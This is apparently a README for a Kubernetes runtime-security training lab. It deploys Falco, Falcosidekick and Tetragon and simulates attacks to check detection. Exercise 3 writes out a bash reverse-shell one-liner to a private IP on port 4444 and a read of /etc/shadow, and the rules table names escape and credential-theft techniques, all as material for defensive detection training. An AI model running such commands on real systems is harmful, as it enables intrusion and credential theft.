# Lab 04: Runtime Security

Deploy runtime threat detection with Falco and Tetragon. Detect container escapes, reverse shells, cryptominers, and suspicious file access in real-time. Terraform provisions the detection stack.

## Objectives

- Deploy Falco via Helm on minikube (Terraform-managed)
- Write custom Falco rules for container-specific threats
- Simulate attacks and verify detection fires
- Build an alert pipeline (Falco → Falcosidekick → Slack/log)
- Bonus: Deploy Tetragon for eBPF-based kernel-level detection

## Prerequisites

```bash
minikube start --driver=docker --memory=6144 --cpus=3
# Extra memory needed for Falco kernel module
```

## Exercises

### Exercise 1: Deploy Falco (Terraform)

```bash
cd terraform/
terraform init
terraform apply
```

Provisions:
- Falco (kernel module mode) in `falco-system` namespace
- Falcosidekick for alert forwarding
- Custom rules ConfigMap
- Test namespace with intentionally vulnerable workloads

Verify:
```bash
kubectl get pods -n falco-system
kubectl logs -n falco-system -l app.kubernetes.io/name=falco --tail=20
```

### Exercise 2: Custom Detection Rules

Write Falco rules for common container threats:

| Rule | Detects |
|------|---------|
| `shell_in_container` | Shell spawned in non-shell container |
| `sensitive_file_read` | Reads to /etc/shadow, /etc/passwd, /proc/self/environ |
| `reverse_shell` | Outbound connection on common reverse shell ports |
| `crypto_miner` | Known miner binaries or stratum protocol connections |
| `container_escape` | Mount of host filesystem, nsenter, chroot |
| `k8s_secret_access` | Unauthorized reads of mounted secrets |

Rules are in `falco-rules/custom-rules.yaml`.

### Exercise 3: Attack Simulation

Run attacks and verify Falco detects each one:

```bash
# Deploy the attack simulator
kubectl apply -f k8s/attack-simulator.yaml

# 1. Shell in container (should trigger alert)
kubectl exec -n lab-runtime deploy/target-app -- /bin/sh -c "whoami"

# 2. Sensitive file read
kubectl exec -n lab-runtime deploy/target-app -- cat /etc/shadow

# 3. Reverse shell attempt
kubectl exec -n lab-runtime deploy/target-app -- \
  bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" 2>/dev/null || true

# 4. Package manager in container (supply chain attack indicator)
kubectl exec -n lab-runtime deploy/target-app -- apt-get update 2>/dev/null || true

# 5. Check Falco caught everything
kubectl logs -n falco-system -l app.kubernetes.io/name=falco --tail=50 | grep -i "Warning\|Critical"
```

### Exercise 4: Alert Pipeline

Configure Falcosidekick to forward alerts:

```bash
# Verify sidekick is receiving alerts
kubectl logs -n falco-system -l app=falcosidekick --tail=20

# Check the webhook output (simulated Slack)
kubectl logs -n falco-system deploy/alert-receiver
```

### Exercise 5: Tetragon (Bonus — eBPF)

Deploy Cilium Tetragon for kernel-level observability:

```bash
kubectl apply -f k8s/tetragon/

# Watch process executions in real-time
kubectl exec -n kube-system -ti ds/tetragon -c tetragon -- \
  tetra getevents -o compact --namespace lab-runtime

# Enforce: kill process if it matches policy
kubectl apply -f k8s/tetragon/kill-reverse-shell.yaml
```

## Success Criteria

- [ ] Falco deployed and processing events
- [ ] Custom rules loaded (6 rules minimum)
- [ ] Shell-in-container detected within 5 seconds
- [ ] Sensitive file read detected
- [ ] Reverse shell attempt detected
- [ ] Alerts forwarded to sidekick (visible in logs)
- [ ] `terraform destroy` cleans everything
- [ ] Bonus: Tetragon process execution visibility working

## Files

```
lab-04-runtime-security/
├── README.md
├── terraform/
│   ├── main.tf                 # Providers, Falco Helm release
│   ├── falco.tf                # Falco + Falcosidekick config
│   ├── namespace.tf            # Lab namespace + vulnerable workloads
│   └── variables.tf
├── falco-rules/
│   └── custom-rules.yaml       # Custom detection rules
├── k8s/
│   ├── attack-simulator.yaml   # Pod with attack tools pre-installed
│   ├── target-app.yaml         # Intentionally vulnerable target
│   └── tetragon/
│       ├── install.yaml
│       └── kill-reverse-shell.yaml
└── results/
    └── .gitkeep
```
